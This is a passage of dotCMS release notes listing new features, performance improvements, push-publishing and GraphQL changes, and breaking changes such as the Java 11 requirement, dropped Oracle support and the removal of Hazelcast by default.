* Introduced Headless Widgets: A single widget can now produce HTML or JSON depending on the rendering context.
* Added default paths for image or file fields, helping editors quickly find files without digging through a file tree.
* Bulk actions now display job progress.
* Added thumbnails to content search listings.
* Improved SVG handling.
* Rules can now be used to rewrite URLs.

### Page Building

* Added a slick new Template designer; building a layout has never been simpler.
* Content palette now allows for simple, click-and-drag content reuse.
* You can now drag and drop local images or files into pages.

### System Management

* Added support for [Bash scripts for CI/CD](https://www.dotcms.com/docs/latest/ci-cd). You can bootstrap environments with:
  + Sites
  + Languages
  + Content Types
  + Folders
  + Files
  + Templates
  + Containers
* Consistent identifiers: Most dotCMS unique identifiers are now assigned based on their paths or unique values. For example, if you create the file `demo.dotcms.com/my-first-image.jpg` on any dotCMS instance, it will have the same identifier.
* dotCMS can now generate secure passwords for back-end users.
* You can now download your entire installation — including assets and a full SQL dump — from the back end. Access this feature on the admin panel under System > Maintenance > Tools.
* Default Language can now be changed from the back end
* Enabled users to configure most aspects of dotCMS [via environment variables](docs/latest/configuration-properties), including [database configuration](docs/latest/database-configuration), [mail configuration](docs/latest/mail-configuration), and more.
* Updated [Docker image and configuration](docs/latest/docker-image-configuration-options).

### Apps / Integrations

* dotCDN is now built in; view usage stats and manage your cache under the admin panel's Dev Tools.
* App secrets can now be imported and exported.
* New app available for Prerender integration.

### Performance

* Reimplemented Redis Cache and Redis Pub/Sub.
* Garbage collection is now in the capable and “pauseless” hands of Shenandoah GC. This change can be overridden by passing other options to the JVM.
* Image filters are more performant — especially with large images.
* Sped things up by removing Sync Block from BlockPageCache.
* GZIP now enabled by default.
* `$dotcontent.find($identifier)` now relies on cache rather than elasticsearch.
* Velocity rendering now uses cached binary metadata, requiring fewer file system calls.

### Push Publishing and Bundles

* Added Bundle Manifests: See exactly what was pushed and why in any given bundle!
* Added a push-publishing listener, which fires from the receiver when push publishing is complete.
* Enabled bundle delete and cleanup.
* Large bundles are more performant: faster and more stable!

### OSGi Plugins

* Reconfigured to rely on OSGi Extras; fragments are no longer needed, though still supported.
* SAML startup does not conflict with other OSGi plugins.

### GraphQL

* Static GraphQL cache can rebuild lazily and will return stale data as the cache is refreshed in the background.
* Now supports dotAssets for file or image fields.

### Breaking Changes

* Requires Java 11 to run.
* Only PostgreSQL and MSSQL are supported; support for Oracle has been discontinued.
  + [This tool can simplify the migration from MySQL to PostgreSQL](https://github.com/dotCMS/dotcms-utilities/tree/main/mysql_to_postgres). It is believed to work in most cases, though it has not been tested with significantly old versions of the software. It is still recommended, as it is generally, that you make backups before performing any major operation on a database.
* Hazelcast cache transport layer has been removed by default. We recommend relying on a PubSub provider — either Redis or PostgreSQL — to wire your clusters. If you are running with PostgreSQL as your primary DB, there is no need to do anything. If you are running against MSSQL, we suggest running a lightweight PostgreSQL or Redis instance to provide network cache invalidations. If required, Hazelcast cache transport can be re-enabled by mounting a custom hazelcast-config into your docker image. This is the last major LTS version that will support Hazelcast as a cache transport.
* Installations using Docker will need to update their configuration options, as they have changed.
* Docker now runs dotCMS with the user:group `65001:65001`. You will need to `chown` any file shares that you have mounted in in order for docker to be able to read/write assets.
* `$jsontool` and `$xmltool` calls to localhost will be blocked by default. This behavior can be changed through a config variable.
* Hostnames for sites are now supposed to be immutable and should not be changed once set. The hostname field for sites will now only accept DNS-valid characters.
* `/api/v2/users` was incorporated into `/api/v1/users`. Any calls to `/api/v2/users` should be redirected to `/api/v1/users`.
